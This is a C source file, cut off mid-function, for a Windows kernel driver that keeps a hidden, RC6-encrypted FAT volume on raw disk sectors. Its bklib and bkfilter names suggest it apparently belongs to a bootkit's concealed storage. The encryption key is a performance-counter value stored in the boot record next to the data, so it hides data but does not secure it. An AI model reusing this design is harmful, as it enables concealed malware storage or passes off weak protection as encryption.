//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// FsLib project
//	
// module: vfat.c
// $Revision: 67 $
// $Date: 2012-05-29 22:20:56 +0400 (Вт, 29 май 2012) $
// description:
//  Virtual FAT partition driver.

#include <ntifs.h>
#include <ntddk.h>

#include "version.h"
#include "ntddkex.h"
#include "kdbg.h"
#include "bklib.h"
#include "..\bklib\fssup.h"
#include "vfat.h"
#include "fslib.h"
#include "rc6.h"

#ifdef	_BK_FILTER
	#include "..\bkfilter\bkfilter.h"
#endif


VFAT_VOLUME		g_VfatVolume = {0};
UCHAR			g_VfatRc6Key[RC6_KEY_CHARS];

// ---- Low level disk IO -------------------------------------------------------------------------------------------------

//
//	Encrypts/Decrypts sectors data
//
VOID	VfatRc6CryptSectors(
	PCHAR	InBuffer,		// Source buffer
	PCHAR	OutBuffer,		// Destination buffer
	ULONG	Count,			// Number of sectors 
	ULONG	SubKey,			// Sub key value
	BOOL	Encrypt			// TRUE to encrypt, FALSE to decrypt data
	)
{
	ULONG		i, c, k;
	ULONG		CryptBlock[RC6_BLOCK_SIZE/sizeof(ULONG)];
	RC6CONTEXT	CryptCtx;

	for (i=0; i<Count; i++)
	{
		RC6KeySetup(&CryptCtx, (PUCHAR)&g_VfatRc6Key);

		for (c=0; c<(VFAT_SECTOR_SIZE / RC6_BLOCK_SIZE); c++)
		{
			if (Encrypt)
			{
				for (k=0; k<(RC6_BLOCK_SIZE/sizeof(ULONG)); k++)
					CryptBlock[k] = _rotl(((PULONG)InBuffer)[k] ^ (SubKey + i), c);

				MainRC6Encrypt(&CryptCtx, (PULONG)&CryptBlock, (PULONG)OutBuffer);
			}
			else
			{
				MainRC6Decrypt(&CryptCtx, (PULONG)InBuffer, (PULONG)&CryptBlock);

				for (k=0; k<(RC6_BLOCK_SIZE/sizeof(ULONG)); k++)
					((PULONG)InBuffer)[k] = _rotr(CryptBlock[k], c) ^ (SubKey + i);
			}

			InBuffer += RC6_BLOCK_SIZE;
			OutBuffer += RC6_BLOCK_SIZE;
		}	// for (c=0;
	}	// for (i=0; i<Count; i++)
}


//
//	Writes sectors to a disk. Performs encryption if needed.
//
NTSTATUS	VfatWriteSectors(
	PUNICODE_STRING uDriveName, 
	PCHAR			pBuffer, 
	ULONG			Length, 
	ULONGLONG		StartSector, 
	ULONG			Count,
	BOOL			Encrypt
	)
{
	NTSTATUS	ntStatus;
	PCHAR		NewBuffer;

	ASSERT((Length / VFAT_SECTOR_SIZE) >= Count);

	if (Encrypt)
	{
		if (NewBuffer = MyAllocatePool(PagedPool, Length))
		{
			VfatRc6CryptSectors(pBuffer, NewBuffer, Count, (ULONG)StartSector, TRUE);
#ifdef	_BK_FILTER
			ntStatus = FltWriteSectors(NewBuffer, (ULONG)StartSector, Count);
#else
			ntStatus = BkWriteSectors(uDriveName, NewBuffer, Length, StartSector, Count);
#endif
			MyFreePool(NewBuffer);
		}
		else
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	}	// if (Encrypt)
	else
#ifdef	_BK_FILTER
		ntStatus = FltWriteSectors(pBuffer, (ULONG)StartSector, Count);
#else
		ntStatus = BkWriteSectors(uDriveName, pBuffer, Length, StartSector, Count);
#endif

	return(ntStatus);
}

//
//	Writes VBR sector to disk and saves RC6 key into it.
//
NTSTATUS	VfatWriteVbr(
	PUNICODE_STRING uDriveName, 
	PVBR			pVbr, 
	ULONGLONG		StartSector
	)
{
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	PCHAR	NewBuffer;

	if (NewBuffer = MyAllocatePool(PagedPool, VFAT_SECTOR_SIZE))
	{
		// Encrypting whole VBR
		VfatRc6CryptSectors((PCHAR)pVbr, NewBuffer, 1, (ULONG)StartSector, TRUE);

		// Storing encryption key within the VBR
		memcpy(NewBuffer + VFAT_SECTOR_SIZE - RC6_KEY_CHARS, &g_VfatRc6Key, RC6_KEY_CHARS);

		// Writing encrypted VBR with the encryption key to disk
		ntStatus = VfatWriteSectors(uDriveName, NewBuffer, VFAT_SECTOR_SIZE, StartSector, 1, FALSE);

		MyFreePool(NewBuffer);
	}	// if (NewBuffer = MyAllocatePool(PagedPool, VFAT_SECTOR_SIZE))

	return(ntStatus);
}

//
//	Reads sectors from a disk. Performs decryption if needed.
//
NTSTATUS	VfatReadSectors(
	PUNICODE_STRING uDriveName, 
	PCHAR			pBuffer, 
	ULONG			Length, 
	ULONGLONG		StartSector, 
	ULONG			Count,
	BOOL			Decrypt
	)
{
	NTSTATUS	ntStatus;
				
	ASSERT((Length / VFAT_SECTOR_SIZE) >= Count);

#ifdef	_BK_FILTER
	ntStatus = FltReadSectors(pBuffer, (ULONG)StartSector, Count);
#else
	ntStatus = BkReadSectors(uDriveName, pBuffer, Length, StartSector, Count);
#endif

	if (NT_SUCCESS(ntStatus) && Decrypt)
		VfatRc6CryptSectors(pBuffer, pBuffer, Count, (ULONG)StartSector, FALSE);

	return(ntStatus);
}


VOID VfatGenerateKey(PCHAR pKey)
{
	ASSERT(RC6_KEY_CHARS == (2 * sizeof(LARGE_INTEGER)));
	*((PLARGE_INTEGER)pKey) = KeQueryPerformanceCounter((PLARGE_INTEGER)(pKey + sizeof(LARGE_INTEGER)));
}

// ---- File Control Block ------------------------------------------------------------------------------------------------

static	PVFAT_FCB	VfatAllocateFcb(VOID)
{
	PVFAT_FCB	pFcb = NULL;

	if (pFcb = MyAllocatePool(PagedPool, sizeof(VFAT_FCB)))
	{
		memset(pFcb, 0, sizeof(VFAT_FCB));
		InitializeListHead(&pFcb->FcbListHead);
		InitializeListHead(&pFcb->FcbListEntry);
		KeInitializeMutex(&pFcb->Lock, 0);
#if DBG
		pFcb->Magic = VFAT_FCB_MAGIC;
#endif
	}
	return(pFcb);
}


static	VOID VfatReleaseFcb(PVFAT_FCB	pFcb)
{
	ASSERT_FCB(pFcb);
	ASSERT(pFcb->ReferenceCount == 0);
	ASSERT(IsListEmpty(&pFcb->FcbListHead));

	if (!IsListEmpty(&pFcb->FcbListEntry))
		RemoveEntryList(&pFcb->FcbListEntry);

	MyFreePool(pFcb);
}

static	VOID VfatLockFcb(PVFAT_FCB	pFcb)
{
	VfatLockObject(pFcb);
	ASSERT((pFcb->Flags & FCB_FLAG_DIRTY) == 0);
}


static VOID	VfatGetSystemTime(PTIME_FIELDS Times)
{
	LARGE_INTEGER	SystemTime;
	KeQuerySystemTime(&SystemTime);
	RtlTimeToTimeFields(&SystemTime, Times);
}

static	VOID VfatTimeFieldsToFatTime(PTIME_FIELDS pTimes, PFAT_DATE pDate, PFAT_TIME pTime)
{
	pDate->Day = pTimes->Day;
	pDate->Month = pTimes->Month;
	pDate->Year = pTimes->Year - 1980;
	pTime->Hour = pTimes->Hour;
	pTime->Minutes = pTimes->Minute;
	pTime->Seconds = pTimes->Second / 2;
}

static VOID VfatGetDateTime(PFAT_DATE pDate, PFAT_TIME pTime)
{
	TIME_FIELDS	TimeFields;
	VfatGetSystemTime(&TimeFields);
	VfatTimeFieldsToFatTime(&TimeFields, pDate, pTime);
}


static VOID	VfatDateTimeToSysTime(PLARGE_INTEGER	pSysTime, PFAT_DATE pDate, PFAT_TIME pTime)
{
	TIME_FIELDS	TimeFields = {0};
	TimeFields.Day = pDate->Day;
	TimeFields.Month = pDate->Month;
	TimeFields.Year = pDate->Year + 1980;
	TimeFields.Hour = pTime->Hour;
	TimeFields.Minute = pTime->Minutes;
	TimeFields.Second = pTime->Seconds * 2;

	RtlTimeFieldsToTime(&TimeFields, pSysTime);
}

static NTSTATUS VfatSaveVolumeData(PVFAT_VOLUME	pVolume)
{
	NTSTATUS ntStatus = STATUS_SUCCESS;
	ULONG i, FatSize = pVolume->pVbr->Bpb.SectorsPerFat * VFAT_SECTOR_SIZE;
	ULONGLONG	StartSector;
	PCHAR		Sector;
	
	// Writing FAT(s)
	for (i=0; (NT_SUCCESS(ntStatus) && i<(ULONG)(pVolume->pVbr->Bpb.NumberOfFats)); i++)
	{
		StartSector = pVolume->StartSector + pVolume->pVbr->Bpb.RecervedSectors + (i * pVolume->pVbr->Bpb.SectorsPerFat);
		ntStatus = VfatWriteSectors(pVolume->pDeviceName, (PCHAR)pVolume->Fat0, FatSize, StartSector, pVolume->pVbr->Bpb.SectorsPerFat, TRUE);
	}
	if (NT_SUCCESS(ntStatus))
		// Writing VBR
		ntStatus = VfatWriteVbr(pVolume->pDeviceName, pVolume->pVbr, pVolume->StartSector);

	return(ntStatus);
}


static NTSTATUS	VfatFormatPartition(PBK_FS_AREA pFsArea)
{
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	PVBR		pVbr = NULL;
	PFAT		Fat0 = NULL;
	ULONG		EntriesPerSector = pFsArea->BytesPerSector / sizeof(FAT_DIR_ENTRY);
	ULONG		FatsPerSector = pFsArea->BytesPerSector / sizeof(FAT);
	ULONG		i, FatSize, FatRecords, RootDirSize;
	ULONGLONG	StartSector;

	do 
	{
		// Initializing VBR
		if (!(pVbr = MyAllocatePool(PagedPool, pFsArea->BytesPerSector)))
			break;

		memset(pVbr, 0, pFsArea->BytesPerSector);
		memcpy(&pVbr->VolumeOemId, VFAT_OEM_ID, sizeof(VFAT_OEM_ID));

		pVbr->Bpb.SectorSize = (USHORT)pFsArea->BytesPerSector;
		pVbr->Bpb.SectorsPerCluster = 1;
		pVbr->Bpb.RecervedSectors = 1;
		pVbr->Bpb.NumberOfFats = 1;

		// Calculating FAT size (sectors)
		i = (pFsArea->NumberOfSectors - pVbr->Bpb.RecervedSectors - pVbr->Bpb.NumberOfFats);
		i = (i + FatsPerSector - 1) / FatsPerSector;
		pVbr->Bpb.SectorsPerFat = (USHORT)i;

		// Total number of reserved sectors between volume start and partition
		pVbr->Bpb.SmallSectorsCount = (USHORT)(pVbr->Bpb.RecervedSectors + (pVbr->Bpb.NumberOfFats * pVbr->Bpb.SectorsPerFat)); 
		
		// Total number of sectors within the partition
		pVbr->Bpb.FatTotalSectors = pFsArea->NumberOfSectors - pVbr->Bpb.SmallSectorsCount;

		// Initializing file allocation tables
		FatSize = pVbr->Bpb.SectorsPerFat * pFsArea->BytesPerSector;	// bytes
		if (!(Fat0 = MyAllocatePool(PagedPool, FatSize)))
			break;

		// Initializng Root Directory first sector
		pVbr->Bpb.FirstRDSector = 2;

		memset(Fat0, 0, FatSize);
		Fat0[0] = FAT_EOC;
		Fat0[1] = FAT_EOC;
		Fat0[2] = FAT_EOC;		// will be the first sector of the root directory
		
		i = pVbr->Bpb.FatTotalSectors;
		FatRecords = FatSize / sizeof(FAT);		// number of FAT records
		while((i + 2) < FatRecords)
		{
			Fat0[i + 2] = FAT_BAD;
			i += 1;
		}

		ntStatus = STATUS_SUCCESS;

		VfatGenerateKey((PCHAR)&g_VfatRc6Key);

		// Writing FAT(s)
		for (i=0; (NT_SUCCESS(ntStatus) && i<(ULONG)(pVbr->Bpb.NumberOfFats)); i++)
		{
			StartSector = pFsArea->StartSector + pVbr->Bpb.RecervedSectors + (i * pVbr->Bpb.SectorsPerFat);
			ntStatus = VfatWriteSectors(pFsArea->pDeviceName, (PCHAR)Fat0, FatSize, StartSector, pVbr->Bpb.SectorsPerFat, TRUE);
		}
		if (!NT_SUCCESS(ntStatus))
			break;

		// Writing VBR
		ntStatus = VfatWriteVbr(pFsArea->pDeviceName, pVbr, pFsArea->StartSector);

	} while(FALSE);

	if (pVbr)
		MyFreePool(pVbr);

	if (Fat0)
		MyFreePool(Fat0);

	return(ntStatus);
}


static NTSTATUS	VfatLoadVolume(PBK_FS_AREA pFsArea, PVFAT_VOLUME pVolume)
{
	ULONG		bSize;
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	ULONGLONG	StartSector;

	KeInitializeMutex(&pVolume->Lock, 0);

	do	// not a loop
	{

		if (!(pVolume->pVbr = MyAllocatePool(PagedPool, pFsArea->BytesPerSector)))
			break;

		// Reading VBR sector as it is (without decryption)
		ntStatus = VfatReadSectors(pFsArea->pDeviceName, (PCHAR)pVolume->pVbr, pFsArea->BytesPerSector, pFsArea->StartSector, 1, FALSE);
		if (!NT_SUCCESS(ntStatus))
			break;

		// Copying RC6 key from the VBR sector
		memcpy(&g_VfatRc6Key, (PCHAR)pVolume->pVbr + pFsArea->BytesPerSector - RC6_KEY_CHARS, RC6_KEY_CHARS);

		// Reloading VBR and decrypting it
		ntStatus = VfatReadSectors(pFsArea->pDeviceName, (PCHAR)pVolume->pVbr, pFsArea->BytesPerSector, pFsArea->StartSector, 1, TRUE);
		if (!NT_SUCCESS(ntStatus))
			break;
		
		ntStatus = STATUS_INVALID_IMAGE_FORMAT;
		if (memcmp(&pVolume->pVbr->VolumeOemId, VFAT_OEM_ID, sizeof(VFAT_OEM_ID)) != 0)
			break;

		if (pVolume->pVbr->Bpb.SectorSize != pFsArea->BytesPerSector)
			break;

		if (pVolume->pVbr->Bpb.SectorsPerFat == 0 || pVolume->pVbr->Bpb.SectorsPerFat > FAT_SIZE_MAX)
			break;

		
		// Reading FAT
		bSize = pVolume->pVbr->Bpb.SectorsPerFat * pFsArea->BytesPerSector;
		if (!(pVolume->Fat0 = MyAllocatePool(PagedPool, bSize)))
		{
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}	

		StartSector = pFsArea->StartSector + pVolume->pVbr->Bpb.RecervedSectors;
		ntStatus = VfatReadSectors(pFsArea->pDeviceName, (PCHAR)pVolume->Fat0, bSize, StartSector, pVolume->pVbr->Bpb.SectorsPerFat, TRUE);
		if (!NT_SUCCESS(ntStatus) || pVolume->Fat0[0] != FAT_EOC || pVolume->Fat0[1] != FAT_EOC)
		{
			ntStatus = STATUS_INVALID_IMAGE_FORMAT;
			break;
		}

		pVolume->StartSector = pFsArea->StartSector;
		pVolume->pDeviceName = pFsArea->pDeviceName;
		pVolume->Flags |= VF_ACTIVE;

		// Initializing Root Directory
		if (!(pVolume->RootFcb = VfatAllocateFcb()))
		{
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		pVolume->RootFcb->pVolume = pVolume;
		pVolume->RootFcb->ReferenceCount = 1;
		pVolume->RootFcb->DirEntry.Cluster = pVolume->pVbr->Bpb.FirstRDSector;
		pVolume->RootFcb->DirEntry.FileSize = pVolume->pVbr->Bpb.RDSize;

	} while(FALSE);

	if (!NT_SUCCESS(ntStatus))
	{

		if (pVolume->Fat0)
			MyFreePool(pVolume->Fat0);
		if (pVolume->pVbr)
			MyFreePool(pVolume->pVbr);
	}

	return(ntStatus);

}


NTSTATUS	VfatInitialize(PBK_FS_AREA pFsArea)
{
	NTSTATUS	ntStatus;

	memset(&g_VfatVolume, 0, sizeof(VFAT_VOLUME));
	ntStatus = VfatLoadVolume(pFsArea, &g_VfatVolume);
	if (ntStatus == STATUS_INVALID_IMAGE_FORMAT)
	{
		if (NT_SUCCESS(ntStatus = VfatFormatPartition(pFsArea)))
		{
			memset(&g_VfatVolume, 0, sizeof(VFAT_VOLUME));
			ntStatus = VfatLoadVolume(pFsArea, &g_VfatVolume);
		}
	}	// if (ntStatus == STATUS_INVALID_IMAGE_FORMAT)

	return(ntStatus);
}


static VOID	VfatCleanupVolume(PVFAT_VOLUME pVolume)
{
	if (pVolume->Flags & VF_ACTIVE)
	{
		VfatLockVolume(pVolume);
		InterlockedAnd(&pVolume->Flags, ~VF_ACTIVE);

		if (pVolume->Fat0)
			MyFreePool(pVolume->Fat0);
		if (pVolume->pVbr)
			MyFreePool(pVolume->pVbr);

		VfatUnlockVolume(pVolume);
	}
}


VOID	VfatCleanup(VOID)
{
	VfatCleanupVolume(&g_VfatVolume);
}


LONG	AnsiStrRChr(PANSI_STRING aStr, UCHAR uChar)
{
	LONG i = aStr->Length;
	while((i -= 1) >= 0)
	{
		if (aStr->Buffer[i] == uChar)
			break;
	}

	return(i);
}


LONG	AnsiStrChr(PANSI_STRING aStr, UCHAR uChar)
{
	ULONG i = 0;

	while((i < aStr->Length) && (aStr->Buffer[i] != uChar))
		i += 1;

	return(i);
}



static NTSTATUS VfatTruncateChain(
							PVFAT_VOLUME pVolume,
							USHORT	FirstSector,		// File first sector number
							LONG	Index				// Sector to truncate from
							)
{
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	FAT	Next, Current = (FAT)FirstSector;

	VfatLockVolume(pVolume);
		
	do 
	{
		Index -= 1;
		Next = pVolume->Fat0[Current];
		if (Next == FAT_RESERVED || Next == FAT_AVALIABLE || Next == FAT_BAD)
		{
			ntStatus = STATUS_NO_SUCH_FILE;
			break;
		}

		if (Index < 0)
			pVolume->Fat0[Current] = FAT_AVALIABLE;
		else if (Index == 0)
			pVolume->Fat0[Current] = FAT_EOC;
	
		Current = Next;
	} while (Next != FAT_EOC);
	
	VfatUnlockVolume(pVolume);

	return(ntStatus);
}


//
//	Scans FAT for the next free sector starting from the specified one.
//	In case of no free sectors avaliable returns 0.
//
static FAT	VfatFindFreeSector(PVFAT_VOLUME pVolume, FAT Start)
{
	// Searching from Start index
	FAT	Index = Start;
	do 
	{
		if ((Index += 1) >= pVolume->pVbr->Bpb.FatTotalSectors)
		{
			// No more free space
			Index = 0;
			break;
		}

	} while(pVolume->Fat0[Index] != FAT_AVALIABLE);

	if (Index == 0 && Start != 0)
		// Searching from the beginning of FAT
		Index = VfatFindFreeSector(pVolume, 0);

	return(Index);
}


//
//	Scans FAT chain starting from the FirstSector for the Index sector.
//	If Index sector is not present and Ind
//
NTSTATUS	VfatGetFileSector(PVFAT_VOLUME pVolume, ULONG FirstSector, ULONG Index, PULONG pCurrent)
{
	NTSTATUS	ntStatus = STATUS_INVALID_PARAMETER;
	FAT		Next, Current = (FAT)FirstSector;

	if (Current == 0)
	{
		Index = 0;
		ntStatus = STATUS_DISK_FULL;
		if (Current = VfatFindFreeSector(pVolume, 0))
			pVolume->Fat0[Current] = FAT_EOC;
	}	// if (Current == 0)

	if (Current > 1)
	{
		ntStatus = STATUS_SUCCESS;
		// Walking the FAT chain to obtain current sector index
		while(Index)
		{
			Next = pVolume->Fat0[Current];

			if (Next == FAT_AVALIABLE || Next == FAT_BAD)
			{
				ntStatus = STATUS_NO_SUCH_FILE;
				break;
			}

			if (Next == FAT_EOC)
			{
				// Trying to write beyond the sector chain?
				if (Index > 1)
				{
					ntStatus = STATUS_NO_SUCH_FILE;
					break;
				}

				// Adding new sector to chain
				if (!(Next = VfatFindFreeSector(pVolume, Current)))
				{
					ntStatus = STATUS_DISK_FULL;
					break;
				}

				pVolume->Fat0[Next] = FAT_EOC;
				pVolume->Fat0[Current] = Next;
			}	// if (Next == FAT_EOC)

			Current = Next;
			Index -= 1;
		}	// while(Index)

		*pCurrent = Current;
	}	// if (Current > 1)

	return(ntStatus);
}


static NTSTATUS VfatAppendChain(
							PVFAT_VOLUME pVolume,
							PUSHORT	pFirstSector,		// pointer to the file first sector number
							LONG	Index				// Sector to append to
							)
{
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	ULONG		FileFirst = (ULONG)*pFirstSector;

	ASSERT(Index > 0);
	VfatLockVolume(pVolume);

	ntStatus = VfatGetFileSector(pVolume, FileFirst, 1, &FileFirst);

	if (*pFirstSector == 0)
		*pFirstSector = (USHORT)FileFirst;

	while((Index -= 1) && NT_SUCCESS(ntStatus))
		ntStatus = VfatGetFileSector(pVolume, FileFirst, 1, &FileFirst);
	
	VfatUnlockVolume(pVolume);

	return(ntStatus);
}

static NTSTATUS VfatDeleteFile(PVFAT_FCB Fcb)
{
	NTSTATUS	ntStatus = STATUS_SUCCESS;
	FAT	Next, Current = Fcb->DirEntry.Cluster;

	if (Current > 1)
	{
		ASSERT(Fcb->DirEntry.FileSize);
		ntStatus = VfatTruncateChain(Fcb->pVolume, Current, 0);
	} // if (Current > 1)

	Fcb->DirEntry.FileName.Name[0] = 0;

	return(ntStatus);
}

static NTSTATUS	VfatReadFileSector(PVFAT_VOLUME pVolume, ULONG FirstSector, ULONG Index, PCHAR pSector)
{
	NTSTATUS	ntStatus = STATUS_INVALID_PARAMETER;
	FAT			Current = (FAT)FirstSector;

	ASSERT(KeGetCurrentIrql() == PASSIVE_LEVEL);
	VfatLockVolume(pVolume);

	if (Current > 1)
	{
		ntStatus = STATUS_SUCCESS;

		// Walking the FAT chain to obtain current sector index
		while(Index)
		{
			Current = pVolume->Fat0[Current];

			if (Current == FAT_AVALIABLE || Current >= FAT_RESERVED)
			{
				// Current sector is the last one or is corrupt
				ntStatus = STATUS_NO_SUCH_FILE;
				break;
			}
			Index -= 1;
		}	// while(Index)

		if (NT_SUCCESS(ntStatus))
		{
			ULONGLONG	StartSector = pVolume->StartSector + pVolume->pVbr->Bpb.SmallSectorsCount + Current - 2;
			ntStatus = VfatReadSectors(pVolume->pDeviceName, pSector, VFAT_SECTOR_SIZE, StartSector, 1, TRUE);
		}	// if (NT_SUCCESS(ntStatus))
	}	// if (Current > 1)
	
	VfatUnlockVolume(pVolume);
	return(ntStatus);
}


static NTSTATUS	VfatWriteFileSector(PVFAT_VOLUME pVolume, ULONG FirstSector, ULONG Index, PCHAR pSector, PULONG pCurrent)
{
	NTSTATUS	ntStatus = STATUS_INVALID_PARAMETER;
	ULONG		Current;

	ASSERT(KeGetCurrentIrql() == PASSIVE_LEVEL);
	VfatLockVolume(pVolume);

	ntStatus = VfatGetFileSector(pVolume, FirstSector, Index, &Current);
	if (FirstSector == 0)
		*pCurrent = Current;

	if (NT_SUCCESS(ntStatus))
	{
		ULONGLONG	StartSector = pVolume->StartSector + pVolume->pVbr->Bpb.SmallSectorsCount + Current - 2;
		ntStatus = VfatWriteSectors(pVolume->pDeviceName, pSector, VFAT_SECTOR_SIZE, StartSector, 1, TRUE);
	}

	VfatUnlockVolume(pVolume);

	return(ntStatus);
}


static	NTSTATUS VfatReadFileInternal(PVFAT_FILE_CONTEXT FileCtx, PVOID	Buffer, PULONG bRead)
{
	NTSTATUS		ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	PVFAT_FCB		Fcb = FileCtx->Fcb;
	ULONG			i, StartSector, NumberSectors, FirstOffset;
	PCHAR			ReadBuffer, Current;

	if (Fcb->DirEntry.Cluster == 0 || Fcb->DirEntry.FileSize == 0 || *bRead == 0)
	{
		// Trying to read 0 bytes or read from zero-sized file
		*bRead = 0;
		return(STATUS_SUCCESS);
	}

	FirstOffset = FileCtx->pPosition->LowPart % VFAT_SECTOR_SIZE;
	StartSector = FileCtx->pPosition->LowPart / VFAT_SECTOR_SIZE;
	NumberSectors = (FirstOffset + *bRead + VFAT_SECTOR_SIZE - 1) / VFAT_SECTOR_SIZE;
	StartSector += Fcb->DirEntry.Cluster;

	if (ReadBuffer = MyAllocatePool(PagedPool, NumberSectors * VFAT_SECTOR_SIZE))
	{
		Current = ReadBuffer;
		
		for (i=0; i<NumberSectors; i++) 
		{
			ntStatus = VfatReadFileSector(Fcb->pVolume, StartSector, i, Current);
			if (!NT_SUCCESS(ntStatus))
				break;

			Current += VFAT_SECTOR_SIZE;
		}	// for (i=0; i<NumberSectors; i++) 

		if (i != 0)
		{
			// Calculating bytes read
			i = i*VFAT_SECTOR_SIZE - FirstOffset;
			if (i > *bRead)
				i = *bRead;

			FileCtx->pPosition->LowPart += i;
			memcpy(Buffer, ReadBuffer + FirstOffset, i);
			*bRead = i;
			ntStatus = STATUS_SUCCESS;
		}
		MyFreePool(ReadBuffer);
	}	// if (ReadBuffer = MyAllocatePool(PagedPool, NumberSectors * VFAT_SECTOR_SIZE))

	return(ntStatus);
}


static NTSTATUS	VfatWriteFileInternal(PVFAT_FILE_CONTEXT FileCtx, PVOID Buffer, PULONG bWrite)
{
	NTSTATUS		ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	PVFAT_FCB		Fcb = FileCtx->Fcb;
	ULONG			i, StartSector, NumberSectors, FirstOffset;
	PCHAR			WriteBuffer, Current;

	FirstOffset = FileCtx->pPosition->LowPart % VFAT_SECTOR_SIZE;
	StartSector = FileCtx->pPosition->LowPart / VFAT_SECTOR_SIZE;
	NumberSectors = (FirstOffset + *bWrite + VFAT_SECTOR_SIZE - 1) / VFAT_SECTOR_SIZE;
	StartSector += Fcb->DirEntry.Cluster;

	if (WriteBuffer = MyAllocatePool(PagedPool, NumberSectors * VFAT_SECTOR_SIZE))
	{
		Current = WriteBuffer;
		memset(WriteBuffer, 0, NumberSectors * VFAT_SECTOR_SIZE);

		if (FirstOffset || (Fcb->DirEntry.FileSize > *bWrite))
			// Reading StartSector data 
			ntStatus = VfatReadFileSector(Fcb->pVolume, StartSector, 0, WriteBuffer);

		if (Fcb->DirEntry.FileSize > (FileCtx->pPosition->LowPart + *bWrite) && NumberSectors > 1)
			// Reading last sector data
			ntStatus = VfatReadFileSector(Fcb->pVolume, StartSector, NumberSectors - 1, WriteBuffer + (NumberSectors - 1)* VFAT_SECTOR_SIZE);

		memcpy(WriteBuffer + FirstOffset, Buffer, *bWrite);

		for (i=0; i<NumberSectors; i++)
		{
			ntStatus = VfatWriteFileSector(Fcb->pVolume, StartSector, i, Current, &StartSector);
			if (!NT_SUCCESS(ntStatus))
				break;
			Current += VFAT_SECTOR_SIZE;
		}

		if (Fcb->DirEntry.Cluster == 0)
			Fcb->DirEntry.Cluster = (USHORT)StartSector;

		if (NT_SUCCESS(ntStatus))
		{
			FileCtx->pPosition->LowPart += *bWrite;
			if (Fcb->DirEntry.FileSize < FileCtx->pPosition->LowPart)
				// File size increased by write
				Fcb->DirEntry.FileSize = FileCtx->pPosition->LowPart;
			ntStatus = STATUS_SUCCESS;
		}
		MyFreePool(WriteBuffer);
	}	// if (WriteBuffer = MyAllocatePool(PagedPool, NumberSectors * VFAT_SECTOR_SIZE))

	return(ntStatus);

}

static NTSTATUS	VfatGetDirectoryEntry(PVFAT_FCB DirFcb, PFAT_NAME FatName, DWORD CreateOptions, PFAT_DIR_ENTRY DirEntry)
{

	ULONG		i, NumberEntries, DirSize, bRead = 0;
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	PFAT_DIR_ENTRY		Entries = NULL, Matching = NULL, EmptyOne = NULL;
	VFAT_FILE_CONTEXT	FileCtx;
	ULONG	CreationDisposition = (CreateOptions >> 24);

	VfatLockObject(DirFcb);

	DirSize = DirFcb->DirEntry.FileSize;

	FileCtx.Fcb = DirFcb;
	FileCtx.pPosition = &FileCtx.FilePosition;
	FileCtx.FilePosition.QuadPart = 0;

	// Allocating memory for the directory
	// Adding one extra sector to be able to inrease directory size if needed
	while (Entries = MyAllocatePool(PagedPool, DirSize + VFAT_SECTOR_SIZE))	// not a loop
	{
		ntStatus = STATUS_SUCCESS;

		if (DirSize)
		{
			// The directory is not empty
			ASSERT(DirFcb->DirEntry.Cluster > 1);
			ASSERT(DirSize == sizeof(FAT_DIR_ENTRY) * (DirSize / sizeof(FAT_DIR_ENTRY)));

			bRead = DirSize;

			// Reading directory content
			ntStatus = VfatReadFileInternal(&FileCtx, (PCHAR)Entries, &bRead);
			if (!NT_SUCCESS(ntStatus))
				break;

			if (bRead != DirSize)
			{
				// Possibly corrupt directory structure, trying to truncate it
				ASSERT(bRead < DirSize);
				DirSize = ((bRead + sizeof(FAT_DIR_ENTRY) - 1) / sizeof(FAT_DIR_ENTRY)) * sizeof(FAT_DIR_ENTRY);
			}
			
			NumberEntries = bRead / sizeof(FAT_DIR_ENTRY);
			for (i=0; i<NumberEntries; i++)
			{
				if (Entries[i].FileName.Name[0] != 0)
				{
					if (memcmp(&Entries[i].FileName, FatName, sizeof(FAT_NAME)) == 0)
					{
						// Matching entry found
						Matching = &Entries[i];
						break;
					}
				}	// if (Entries[i].FileName[0] != 0)
				else
				{
					// Saving an empty record for future use
					if (EmptyOne == NULL)
						EmptyOne = &Entries[i];
				}
			}	// for (i=0; i<NumberEntries; i++)
		}	// if (DirSize)

		if (!Matching)
		{
			// No entry found 
			if (!(CreationDisposition & FILE_CREATE || CreationDisposition == FILE_OVERWRITE_IF))
			{
				ntStatus = STATUS_OBJECT_NAME_NOT_FOUND;
				break;
			}

			// Creating new file record
			if (!EmptyOne)
			{
				// No empty records: increasing directory size for one sector
				EmptyOne = (PFAT_DIR_ENTRY)((PCHAR)Entries + DirSize);
				memset(EmptyOne, 0, VFAT_SECTOR_SIZE);
				DirFcb->DirEntry.FileSize = (DirSize += sizeof(FAT_DIR_ENTRY));
				DirFcb->Flags |= FCB_FLAG_DIRTY;
			}

			memcpy(&EmptyOne->FileName, FatName, sizeof(FAT_NAME));
			EmptyOne->Cluster = 0;
			EmptyOne->FileSize = 0;
			EmptyOne->Index = (UCHAR)(EmptyOne - Entries);
			VfatGetDateTime((PFAT_DATE)&EmptyOne->CreateDate, (PFAT_TIME)&EmptyOne->CreateTime);
			Matching = EmptyOne; 
		}
		else
		{
			// Directory entry was found
			if (!(CreationDisposition & FILE_OPEN))
				ntStatus = STATUS_OBJECT_NAME_COLLISION;
		}

		memcpy(DirEntry, Matching, sizeof(FAT_DIR_ENTRY));
		break;
	}	// while (Entries = MyAllocatePool(PagedPool, DirSize + VFAT_SECTOR_SIZE))

	VfatUnlockObject(DirFcb);

	if (Entries)
		MyFreePool(Entries);

	return(ntStatus);

}


static BOOL	VfatStringToFileName(PANSI_STRING String, PFAT_NAME FileName)
{
	BOOL	Ret = FALSE;
	LONG	NameLen, ExtLen = 0;

	NameLen = AnsiStrRChr(String, '.');
	if (NameLen < 0)
		NameLen = String->Length;

	if (NameLen < String->Length)
		ExtLen = String->Length - NameLen - 1;

	if (NameLen > 0 && NameLen <= VFAT_NAME_LENGTH && ExtLen <= VFAT_EXTENSION_LENGTH)
	{
		ASSERT(String->Length == (NameLen + ExtLen + 1));
		memset(FileName, 0, sizeof(FAT_NAME));
		memcpy(&FileName->Name, String->Buffer, NameLen);
		if (ExtLen)
